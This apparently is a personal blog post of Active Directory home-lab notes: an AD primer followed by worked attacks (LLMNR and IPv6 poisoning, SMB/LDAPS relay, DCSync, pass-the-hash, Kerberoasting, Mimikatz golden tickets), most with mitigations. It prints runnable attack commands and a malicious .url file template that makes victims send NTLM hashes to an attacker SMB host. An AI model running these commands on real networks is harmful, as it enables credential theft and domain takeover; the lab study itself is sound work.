---
title: "My Active Directory Home Lab"
layout: ""
date: 2025-08-30
---

## What is AD?

Directory service developed by Microsoft to manage Windows domain networks, stores info related to objects, such as Computers, Users, Printers...
- Authenticates using Kerberos tickets 

## Physical AD Components

**Domain Controller :** is a server with the AD DS server role installed that has specifically been promoted to a domain controller
- Host a copy of AD DS directory store
- Provide authentication and authorization services
- Replicate updates to other DCs in domain and forest
- Allow administrative access to manage user accounts and network resources

**AD DS data store :** contains the database files and processes that store and manage directory info for users, services and applications.
 - Consists of the Ntds.dit file
 - Is stored by default  in %SystemRoot%\NTDS folder on all domain controllers
 - Is accessible only through domain controllers processes and protocols

## Logical AD Components

**Domains :** are used to group and manage objects in an organization
- An administrative boundary for applying policies to groups of objects
- A replication boundary for replicating data between DCs
- An authentication and authorization boundary that provides a way to limit the scope of access to resources

**Trees :** A domain tree is a hierarchy of domains in AD DS
- Share a contiguous namespace with the parent domain (contoso.com, emea.contoso.com, na.contoso.com)
- Can have additional child domains
- By default create a two-way transitive trust with other domains

**Forests :** A forest is a collection of one or more domain trees, they :
- Share a common schema
- Share a common configuration pattern
- Share a common global catalog to enable searching
- Enable trusts between all domains in the forest
- Share the Entreprise Admins and Schema Admins groups

**Organizational Units (OUs) :** Ous are AD containers that can contain users, groups, computers, and other OUs
They are used to:
- Represent your organization hierarchically and logically
- Manage a collection of objects in a consistent way
- Delegate permissions o administer groups of objects
- Apply policies

**Trusts :** provide a mechanism for users to gain access to resources in another domain
Directional : the trust direction flows from trusting domain to the trusted domain
Transitive : the trust relationship is extended beyond a two-domain trust to include all other trusted domains
- All domains in a forest trust all other domains in the forest
- Trusts can extend outside the forest

## Attacking Active Directory

This lab is structured as follows :

One Domain Controller : `DC1`

Two Windows 10 clients : `client` and `client2`

Two user accounts : `younesb` and `petep`

One service admin : `SQLService`
 
One user admin account : `tstark`

![](https://younescodes.github.io/my-blog-site/assets/project_structure.jpg)

### Initial attack vectors

#### LLMNR Poisoning :

Link Local Multi-Cast Name Resolution, used to identify hosts when DNS fails to do so.

- Previously NBT-NS (NetBios Name Service)

- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to 

**Step 1 :** Run Responder on attacker via `responder -I eth0 -dwv (Listening)`

![](https://younescodes.github.io/my-blog-site/assets/llmnr1.png)

**Step 2 :** An event occurs... (Example : someone typed a wrong network drive, here we simulate it by trying to access //mistake)

**Step 3 :** Get the hash

![](https://younescodes.github.io/my-blog-site/assets/llmnr2.png)

**Step 4 :** Crack the hash using hashcat

**Mitigation?** 
Best defense is disabling LLMNR and NBT-NS
- Turn OFF Multicast Name Resolution under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in group policy editor

- For NBT-NS : Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced > WINS tab > Select Disable NetBIOS over TCP/IP

- If company must use or can't disable them :

Require Network Access Control

Require strong user passwords (>14 characters + limit common word usage). The more complex and long the password is, the harder it is to crack the hash.

#### SMB Relay : 

Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access

Requirements : SMB signing must be disabled on the target ; Relayed user credentials must be admin on machine

**Step 1:** `nano /usr/share/responder/Responder.conf` and turn off SMB and HTTP

![](https://younescodes.github.io/my-blog-site/assets/relay1.png)

By default, Responder will happily answer SMB/HTTP requests itself.  
But for an SMB relay attack, we want Responder to **collect and pass NTLM auth to ntlmrelayx** instead of grabbing hashes.

**Step 2 :** Run Responder `responder -I eth0`


**Step 3 :** Set up the relay using `impacket-ntlmrelayx -tf targets.txt -smb2support`, where targets.txt must contain only the IP address of the machine you want to compromise (for example `192.168.1.51`), while the other Windows client (`192.168.1.50`) will be the victim that gets poisoned by Responder and sends its authentication, but it does not go into the targets file; you can add `-i` to open an interactive SMB shell accessible through `nc 127.0.0.1 11000`, use `-c` to execute a single command on the target, or `-e` to upload and run a payload like meterpreter.

**Step 4 :** Event occurs on `.50` machine... (Example : victim tries to access a network share that doesn’t exist)

**Step 5 :** Congrats, in this case we dumped local sam hashes including local client2 account hash

![](https://younescodes.github.io/my-blog-site/assets/relay2.png)

to check if smb signing is disabled - `nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24`

![](https://younescodes.github.io/my-blog-site/assets/signing1.png)

**Mitigation?** 
- Enable SMB signing on all devices, completely stops the attack but can cause performance issues with file copies

- Disable NTLM authentication on network, completely stops the attack but if Kerberos stops working, Windows defaults back to NTLM

- Account tiering: limits domain admins to specific tasks (e.g. only log onto servers with need for DA), but enforcing that policy may be difficult

- Local admin restriction: can prevent a lot of lateral movement, but can potentially increase the amount of service desk tickets

**Gaining shell access :**
		`impacket-psexec 'homelab.local/petep:password1$@192.168.1.50'` 
		can do same with `wmiexec` or `smbexec` (half interactive shell use it to get meterpreter for example)


#### IPv6 Attacks using mitm6 + ntlmrelayx.py

`mitm6` is used to spoof IPv6 DNS and router advertisements, pushing a fake WPAD location. 

Windows clients, even if IPv4-only try to fetch `wpad.dat`. When they do, they send NTLM authentication to the attacker. 

`ntlmrelayx` listens and relays those NTLM credentials to LDAPS on the domain controller. LDAPS is needed because LDAP signing is usually enforced (and for LDAPS, channel binding must not be enforced).

**ATTACK FLOW:**

**Step 1 :** Start ntlmrelayx via : `impacket-ntlmrelayx -6 -t ldaps://192.168.1.100 -wh fakewpad.homelab.local -l lootme`

![](https://younescodes.github.io/my-blog-site/assets/mitm1.png)

**Step 2 :**   Start mitm6 via `mitm6 -d homelab.local`

![](https://younescodes.github.io/my-blog-site/assets/mitm2.png)

**Step 3 :** An event occurs (trigger win10 machine rebooting), boom:

![](https://younescodes.github.io/my-blog-site/assets/mitm3.png)

When checking lootme directory:

![](https://younescodes.github.io/my-blog-site/assets/mitm4.png)

We get a bunch of files containing information that can help us through our pentest, take for example `domain_users_by_group.html` :

![](https://younescodes.github.io/my-blog-site/assets/mitm5.png)

Bingo, someone thought it was a good idea to write their password down in the account description...

Additionnally, if we get an Administrator to log in into a client, ntlmrelayx can create a user account that is in the Entreprise Admins group :

![](https://younescodes.github.io/my-blog-site/assets/mitm6.png)

Next we will try to use `impacket-secretsdump` with the credentials of the newly created user as advised in the previous screenshot.

It is a tool for dumping password hashes, Kerberos tickets, and LSA secrets from Windows systems either remotely over SMB or from extracted registry hives (SAM, SYSTEM, SECURITY). It supports cleartext credentials when available, NTLM hashes, and can be used with passwords or pass-the-hash for authentication. 

Usage : `impacket-secretsdump homelab/eghOfpExwq:'cFW,(qQ@H7^u5PV'@DC01.homelab.local -just-dc`

![](https://younescodes.github.io/my-blog-site/assets/mitm7.png)
![](https://younescodes.github.io/my-blog-site/assets/mitm8.png)

Success! We just dumped hashes of practically every user account on the network.
These include Domain Admin, Administrator, krbtgt, service accounts, user accounts, and machine accounts. 
 
With these credentials, we can perform Pass-the-Hash attacks and gain access to any machine or service that relies on NTLM authentication.  
Kerberos keys are also available, which allow Pass-the-Key attacks and forged tickets without relying on NTLM.  

The Administrator hash can be used for immediate remote code execution on the Domain Controller using Impacket tools like `psexec`, `wmiexec`, or `smbexec`.  

At this stage, the domain is fully compromised, and we control authentication across the environment. This attack is called DCSync, it tricks a Domain Controller into thinking you are another DC, the DC then hands over credential material from the NTDS.dit.

**Mitigation?**

 IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. 
 
 If you don’t use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. 
 
 Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to **Block** instead of **Allow** prevents the attack from working:
 
`(Inbound) Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)`

`(Inbound) Core Networking – Router Advertisement (ICMPv6-In)`

`(Outbound) Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)`

If WPAD is not in use internally, disable it via Group Policy and by disabling the **WinHttpAutoProxySvc** service.

Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.

Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.

**Passback Attacks :** https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack

### Other attack vectors

**Strategies for a pentest engagement :**

Begin your day with mitm6 and responder.

Run scans to generate traffic.

If scans are taking too long, look for websites in scope (try with metasploit `http_version`).

Look for default credentials on web logins (Printers, Jenkins, etc).

Think outside the box.


### Post-Compromise Enumeration

**PowerView :** https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

#### Bloodhound :

BloodHound is a tool used to map and analyze Active Directory environments to identify privilege escalation paths. It consists of two main parts: SharpHound, which is the data collector that runs inside the Windows domain, and the BloodHound GUI, which is used on the attacker’s side to process and visualize the data. The purpose of BloodHound is to uncover relationships, hidden attack paths, and misconfigurations that can be abused to move laterally or escalate privileges.

SharpHound is the component responsible for gathering information. It can be deployed as a script or executable on a Windows machine within the target domain. When executed, it collects a variety of Active Directory data such as user and group memberships, domain trusts, access control lists (ACLs), and session information like which users are logged into which machines. Once the collection is complete, SharpHound outputs the results into a zip file containing JSON data.

The typical workflow begins by getting SharpHound onto a Windows host within the domain :


**Step 1 :** Bypass powershell execution policy : `powershell -ep bypass`

![](https://younescodes.github.io/my-blog-site/assets/blood1.png)

**Step 2 :** Run either `.ps1` script or `.exe` file

**Step 3 :** Run this command : `Invoke-BloodHound -CollectionMethod All -Domain homelab.local -OutputDirectory C:... -ZipFilename blood.zip`

![](https://younescodes.github.io/my-blog-site/assets/blood2.png)

After execution, the zip file generated must be exfiltrated back to the attacker’s machine. The attacker then imports this file into the BloodHound GUI, which parses the data and builds a graph-based view of the environment. 

This graph makes it easier to visualize complex AD relationships and to spot potential attack paths such as a regular user account having indirect membership that leads to administrative privileges or misconfigured ACLs that allow privilege abuse.

Pre-made queries are helpful to map out the AD environment and help us gather more leads into our next steps. Some examples include :

**All domain admins :**

![](https://younescodes.github.io/my-blog-site/assets/blood3.png)

**Shortest path to domain admin :**

![](https://younescodes.github.io/my-blog-site/assets/blood4.png)

**All kerberoastable users :**

![](https://younescodes.github.io/my-blog-site/assets/blood5.png)

BloodHound is powerful because it automates the mapping of large, complicated AD structures. It helps attackers identify paths that are not obvious by manual inspection, such as chained group memberships or cross-domain trusts. 
### Post Compromise Attacks
All these attacks require some sort of credential to be effective.
#### Pass The Password/Pass The Hash : 
If we crack a password/or can dump SAM hashes, we can leverage both for lateral movement in the network.

CrackMapExec is a post-exploitation tool used for assessing Active Directory networks. It allows attackers to automate credential validation, command execution, enumeration, and lateral movement across Windows systems. Often described as a Swiss army knife for pentesting AD.

Pass The Password :  `crackmapexec smb <ip/CIDR> -u <user> -d  <domain> -p <pass>`

![](https://younescodes.github.io/my-blog-site/assets/crackmapexec1.png)

We can also dump SAM hashes :

![](https://younescodes.github.io/my-blog-site/assets/crackmapexec2.png)

Using `impacket-secretsdump` :

![](https://younescodes.github.io/my-blog-site/assets/secretsdump1.png)

**Attempting to crack hashes using hashcat :** 
`hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
Result (cracked 2 out of 3 hashes, first is an empty password):

![](https://younescodes.github.io/my-blog-site/assets/hashcat1.png)

Pass The Hash :  `crackmapexec smb <ip/CIDR> -u <user>  -H <hash> --local-auth`

![](https://younescodes.github.io/my-blog-site/assets/crackmapexec3.png) 

(Green plus sign / pwned  indicates good chance/successful attempt) 

**Attempting to get a shell using psexec :** (proof of concept)

![](https://younescodes.github.io/my-blog-site/assets/psexec1.png)

**Mitigation?**
Hard to completely prevent but we can make it more difficult on an attacker  .

**Limit account re-use :**

- Avoid re-using local admin password 

- Disable Guest and Administrator accounts 

- Limit who is a local administrator (least privilege)  

**Utilize strong passwords :**

- The longer the better (>14 characters) 

- Avoid using common words (I like long sentences) 

**Privilege Access Management (PAM) :**

- Check out/in sensitive accounts when needed 

- Automatically rotate passwords on check out and check in 

- Limits pass attacks as hash/password is strong and constantly rotated


#### Token Impersonation :

**What are tokens?**  
Temporary keys that allow you access to a system or network without having to provide credentials each time you access a file. Think of them like cookies for computers.

**Two types:**  
Delegate is created for logging into a machine or using Remote Desktop.  
Impersonate is non-interactive such as attaching a network drive or a domain logon script.

**Token impersonation with incognito :**

**Step 1 :** Run meterpreter session

![](https://younescodes.github.io/my-blog-site/assets/meterpreter2.png)
![](https://younescodes.github.io/my-blog-site/assets/meterpreter1.png)

**Step 2 :** load incognito

![](https://younescodes.github.io/my-blog-site/assets/incognito1.png)

**Step 3 :** List available tokens 

![](https://younescodes.github.io/my-blog-site/assets/incognito2.png)

**Step 4 :** Impersonate Administration token

![](https://younescodes.github.io/my-blog-site/assets/incognito3.png)

**Note :** you cannot run hashdump when impersonating administrator token, run `rev2self`

![](https://younescodes.github.io/my-blog-site/assets/incognito4.png)

Works with other users tokens :

![](https://younescodes.github.io/my-blog-site/assets/incognito5.png)

**Mitigation?**

- Limit user/group token creation permissions (doesn't prevent it 100%)
- Account tiering
- Local admin restriction


#### Kerberoasting :

![](https://younescodes.github.io/my-blog-site/assets/kerber1.png)
**TGT :** ticket granting ticket

**TGS :** ticket granting service ticket

![](https://younescodes.github.io/my-blog-site/assets/kerber2.png)

![](https://younescodes.github.io/my-blog-site/assets/kerber3.png)

Let's try it on our lab:
`impacket-GetUserSPNs homelab.local/petep:password1$ -dc-ip 192.168.1.100 -request`

![](https://younescodes.github.io/my-blog-site/assets/kerber4.png)

Then we can attempt to crack it using hashcat :
`hashcat -m 13100 kerbhash.txt /usr/share/wordlists/rockyou.txt
`
**Mitigation?**

- Strong passwords
- Least privilege

#### GPP (Group Policy Preferences - MS14-025) : 
Group Policy Preferences allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a cPassword. The key was accidentally released. It was patched in MS14-025, but the patch does not prevent previous uses.

**For Practice :** Active machine on HackTheBox

#### URL File Attack :
A URL file attack works by creating a malicious internet shortcut file using something as simple as Notepad, where the .url file is crafted to include an IconFile path that points to a resource on the attacker’s machine, usually over SMB. 
Example:
```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\192.168.1.52\%USERNAME%.icon
IconIndex=0
```

The attacker places this "@xxxxxxx.url" file in a network share that the victim can access. When the victim browses the share, Windows automatically tries to retrieve the icon for the shortcut, which causes the victim’s system to reach out to the attacker’s machine specified in the IconFile path. 

On the attacker side, Responder or a similar tool is running to capture the NTLM authentication attempt made by the victim’s machine. This results in the attacker obtaining the victim’s NTLMv2 hash, which can then be cracked offline or relayed, making it an easy but effective method of credential harvesting in Windows environments.

![](https://younescodes.github.io/my-blog-site/assets/urlfile4.png)

#### Mimikatz : An Overview


**What is Mimikatz? :**  

Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks.  

Dumps credentials stored in memory.  

What you can do with it : Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket...

For this demo, we will assume we compromised the DC, and show what we can do once we compromised it (Persistence, Golden ticket....):

We start by launching mimikatz and typing `privilege::debug` , this is trying to enable the SeDebugPrivilege for the current process. 

This Windows privilege lets a process open and interact with other processes, even those running as SYSTEM. Without it, Mimikatz can’t read the memory of LSASS or other protected processes where credentials and Kerberos tickets are stored. 

Enabling SeDebugPrivilege is basically step zero, because almost all of Mimikatz’s credential dumping and ticket extraction features require access to LSASS memory, and Windows normally restricts that to SYSTEM-level processes. 

If `privilege::debug` fails, most of the powerful functions in Mimikatz won’t work.

**Some commands we can use :**

`sekurlsa::logonpasswords` : extracts credential material from the LSASS process on a Windows machine by reading its memory space where authentication information is stored. When executed, it can reveal plaintext passwords (wdigest), NTLM hashes, Kerberos tickets, and other authentication tokens for all logged-in users on the system. 

This makes it one of the most powerful and commonly used functions in Mimikatz, since it directly provides the attacker with credentials that can be used for lateral movement, privilege escalation, or persistence within a network.

![](https://younescodes.github.io/my-blog-site/assets/mimi2.png)

Attempt at trying to dump SAM :

![](https://younescodes.github.io/my-blog-site/assets/mimi3.png)

Dumping LSA : Usernames and NTLM hashes

![](https://younescodes.github.io/my-blog-site/assets/mimi4.png)

**Golden ticket attack  + pass the ticket:**

A golden ticket attack is a post-exploitation technique where an attacker forges a Kerberos Ticket Granting Ticket (TGT) using the secret key of the krbtgt account, which is the account that signs all TGTs in a domain. 

Once the attacker compromises a domain controller and extracts the krbtgt account’s NTLM hash, they can use tools like Mimikatz to generate golden tickets that allow them to impersonate any user, including domain admins, and access any service in the domain. 

These tickets can be customized to never expire or be reissued, giving the attacker long-term and stealthy persistence in the environment even if passwords are reset for other accounts, since the only true fix is to reset the krbtgt password twice across the domain to invalidate forged tickets.

Executing this command :

![](https://younescodes.github.io/my-blog-site/assets/gt1.png)

We have to write some info down :

 `S-1-5-21-833969855-242020450-2509043900` : *Domain SID*

 `4ecf7518f730dfc45fcad7fc679f53fa` : *NTLM hash of kerberos TGT account*

And using this command :
`kerberos::golden /User:Administrator /domain:homelab.local /sid:S-1-5-21-833969855-242020450-2509043900 /krbtgt:4ecf7518f730dfc45fcad7fc679f53fa /id:500 /ptt`

That command tells Mimikatz to forge and immediately inject (`/ptt` : pass the ticket) a golden ticket for the Administrator  in the domain. It uses the domain’s SID and the NTLM hash of the krbtgt account to sign the ticket. The `/id:500` specifies the RID for the Administrator account, ensuring the forged ticket has the correct identity. 

In short, this command creates a valid-looking Kerberos TGT for the domain Administrator and loads it into memory so the attacker can act as that account.

![](https://younescodes.github.io/my-blog-site/assets/gt2.png)

Following that with `misc::cmd` spawns a new command shell that inherits this authentication context. The result is that the new cmd.exe can immediately access domain resources like file shares, servers, or even remote administration tools using the forged Administrator ticket, effectively giving you a working shell as a domain admin without needing the real password.

We can access any share we want on the network, like in the screenshot below where we accessed the C$ share of CLIENT-WIN10 :

![](https://younescodes.github.io/my-blog-site/assets/gt3.png)

We can also use the windows tool of psexec to get direct access to the machine via the command :
`psexec.exe \\client-win10 cmd.exe ` popping a shell

Use this golden ticket for persistence (adding user...), silver ticket to be stealthier...

## Next steps

